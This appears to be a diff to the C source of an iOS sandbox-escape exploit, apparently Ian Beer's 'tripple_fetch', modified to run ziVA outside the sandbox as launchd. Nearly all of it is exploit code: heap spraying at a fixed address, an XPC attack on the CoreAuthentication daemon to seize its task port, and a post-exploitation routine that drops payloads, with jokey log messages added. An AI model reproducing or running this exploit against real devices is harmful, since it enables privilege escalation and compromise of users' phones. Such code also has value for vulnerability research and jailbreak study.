@@ -1,3 +1,12 @@
+/*
+    This is Ian Beer's tripple_fetch expoit.
+    I do not owe rights on this code.
+    I modified it slightly to run ziVA outside the sandbox as launchd
+    NOTE: don't expect all binaries to be able to run outside the sandbox with just tripple_fetch
+          only binaries with a specific symbol (need to read README.md in tripple_fetch_sdk) will run
+ 
+    If you want to improve the kernel exploit please edit and compile my edited version of ziVA in the tripple_fetch_sdk folder.
+ */
 #include <setjmp.h>
 #include <stdio.h>
 #include <stdlib.h>
@@ -7,14 +16,11 @@
 //#include <mach/mach_vm.h>
 #include <objc/objc.h>
 #include <mach-o/dyld_images.h>
-
-
 #include "liboxpc/oxpc.h"
 #include "minibplist16.h"
-#include "xpc_handshake.h"
-
-#include "post_exploit.h"
-#include "log.h"
+#include "xpc_handshake.h" //just came to say hello (connect to xpc service)
+#include "post_exploit.h" //tasks and payloads
+#include "log.h" //debug log
 
 extern kern_return_t mach_vm_allocate
 (
@@ -23,9 +29,7 @@ extern kern_return_t mach_vm_allocate
  mach_vm_size_t size,
  int flags
  );
-
 uint64_t jmpbuf_and_jop_addr = 0;
-
 
 /* 
   returns a send right to a mach_memory_entry port
@@ -556,7 +560,7 @@ uint64_t build_spray_page() {
   
   mach_vm_address_t spray_base = 0x120204000;
   mach_vm_size_t spray_page_size = 0x4000;
-  err = mach_vm_allocate(mach_task_self(), &spray_base, spray_page_size, 0); // FIXED
+  err = mach_vm_allocate(mach_task_self(), &spray_base, spray_page_size, 0); // FIXED ADDRESS
   if (err != KERN_SUCCESS) {
     printf("mach_vm_allocate at a fixed address failed\n");
     return 0;
@@ -946,34 +950,31 @@ sploit(
 
 int do_exploit() {
 #if 0
-  logMsg("starting exploit\n");
-  char* target_service_name = "com.apple.CoreAuthentication.daemon";
+  logMsg("Starting TRI POLOSKI (bass boosted).\n");
+  char* target_service_name = "com.apple.CoreAuthentication.daemon"; //still think is the fastest one
   char* target_selector = "connectToExistingContext:callback:reply:";
-  
   logMsg("target service:");
   logMsg(target_service_name);
   logMsg("target selector:");
-  logMsg(target_selector);
-  
-  logMsg("\nexploit running...");
-  
+    logMsg(target_selector);
+  logMsg("\Gathering some gopniks to dance with...");
   mach_port_t tp = sploit(target_service_name, target_selector);
   if (tp != MACH_PORT_NULL){
-    printf("got target service task port: %x\n", tp);
+    printf("Gopniks are united at: %x\n", tp);
   } else {
       return -1;
   }
+
+  logMsg("The red army has one from the Tsar!\n");
+  logMsg("Spreading the communism...");
   
-  logMsg("exploit success!\n");
-  logMsg("starting post exploit tasks...");
+  do_post_exploit(tp); //get tasks, drop payloads, cleanup
   
-  do_post_exploit(tp);
-  
-  logMsg("post exploit tasks complete!\n");
-  logMsg("patched debugserver listening on port 1234");
-  logMsg("press ps for process listing");
+  logMsg("We now successfully seized the means of production!\n");
+  //logMsg("patched debugserver listening on port 1234");
+  //logMsg("press ps for process listing");
   
 #endif
-  do_post_exploit(mach_task_self());
+  do_post_exploit(mach_task_self()); //If we are already exploited we want ofcourse to gain our task back at next run
   return 0;
 }
